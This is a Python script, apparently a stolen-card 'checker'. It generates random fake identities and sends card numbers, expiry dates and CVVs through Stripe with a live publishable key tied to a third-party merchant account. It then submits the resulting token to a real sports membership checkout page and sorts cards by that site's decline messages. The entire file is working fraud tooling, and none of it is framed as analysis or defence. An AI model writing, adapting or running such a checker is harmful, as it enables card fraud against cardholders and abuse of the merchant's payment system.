import requests
import string
import random

letters = string.ascii_lowercase
First = ''.join(random.choice(letters) for i in range(6))
Last = ''.join(random.choice(letters) for i in range(6))
PWD = ''.join(random.choice(letters) for i in range(10))
Name = f'{First}+{Last}'
Email = f'{First}.{Last}@gmail.com'
session = requests.Session()

def check(cc,mm,yy,cvv):
    payload_a = {
        'type': 'card',
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_month]': mm,
        'card[exp_year]': yy,
        'guid': '6fc96c71-379d-41a7-bc56-77db74b631f75fd2a9',
        'muid': '5896c21b-3ec2-496d-b07d-97957934c6d7299f99',
        'sid': '3f5617a0-84a8-4319-bf9f-84b4d7bfcfe21c1613',
        'payment_user_agent': 'stripe.js/18d983e54; stripe-js-v3/18d983e54',
        'time_on_page': '71064',
        'key': 'pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX',
        '_stripe_account': 'acct_1JuGXXL3bUJJlRbI'
    }
    su = session.post('https://api.stripe.com/v1/payment_methods', data=payload_a)
    if "error" in su.text:
        return False
    marca = su.json()["card"]["networks"]["available"][0]
    las = su.json()["card"]["last4"]
    token = su.json()["id"]
    last4 = f"XXXXXXXXXXXX{las}"
    payload_b = {
        'level': '1',
        'checkjavascript': '1',
        'other_discount_code': '',
        'username': First,
        'password': 'Mbrf46@$#324#@',
        'password2': 'Mbrf46@$#324#@',
        'bemail': Email,
        'bconfirmemail': Email,
        'fullname': '',
        'user_sport': 'jhff',
        'user_name': First,
        'user_club_name': Last,
        'user_address': 'gfdd',
        'user_address_2': 'gfxx',
        'user_town_city': 'ggfdd',
        'user_county_state': 'gffdd',
        'user_postcode_zip': '13780',
        'user_country': 'United Arab Emirates',
        'user_phone': '2837277272',
        'user_mobile': '283727727',
        'user_requested_url': 'nhfff',
        'url': 'https://gdghff.com',
        'user_looking_for_work_checkbox': '1',
        'user_logo': '(binary)',
        'CardType': marca,
        'discount_code': '',
        'submit-checkout': '1',
        'javascriptok': '1',
        'payment_method_id': token,
        'AccountNumber': last4,
        'ExpirationMonth': mm,
        'ExpirationYear': yy
    }
    ri = session.post('https://sportsprosconnect.com/membership-account/membership-checkout/', data=payload_b)
    if "Your card's security code is invalid." in ri.text:
        return "Your card's security code is invalid."
    elif "Your card's security code is incorrect." in ri.text:
        return "Your card's security code is incorrect."
    elif "Your card number is incorrect." in ri.text:
        return False
    elif "Your card was declined." in ri.text:
        return False
    elif "Customer authentication is required to complete this transaction. Please complete the verification steps issued by your payment provider." in ri.text:
        return False
    elif "Your card has expired." in ri.text:
        return False
    elif "Your card has insufficient funds." in ri.text:
        return "Your card has insufficient funds."